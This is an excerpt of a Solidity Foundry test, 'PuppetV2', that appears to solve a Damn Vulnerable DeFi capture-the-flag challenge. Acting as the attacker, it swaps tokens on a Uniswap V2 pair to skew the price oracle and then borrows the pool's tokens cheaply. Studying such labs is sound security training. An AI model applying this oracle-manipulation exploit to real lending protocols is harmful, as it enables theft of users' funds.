...
contract PuppetV2 is Test {
    ...
    function testExploit() public {
      ...
      address[] memory calld = new address[](2);
      calld[0] = address(dvt);
      calld[1] = address(weth);

      address[] memory calld1 = new address[](2);
      calld1[1] = address(dvt);
      calld1[0] = address(weth);


      vm.startPrank(attacker);
      // for (uint256 i = 0; i < 10; i++) {
      // initial borrow
      uint256 amountOftokens = dvt.balanceOf(attacker);
      uint256 borrowAmount = 1_000_000 ether;

      uint256 outAmount = uniswapV2Router.getAmountOut(
        amountOftokens,
        dvt.balanceOf(address(uniswapV2Pair)),
        weth.balanceOf(address(uniswapV2Pair))
      );

      dvt.approve(address(uniswapV2Router), amountOftokens);
      ...
      uint256 borrowPayment = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
      weth.approve(address(puppetV2Pool), borrowPayment);
      puppetV2Pool.borrow(borrowAmount);
      // }
      vm.stopPrank();
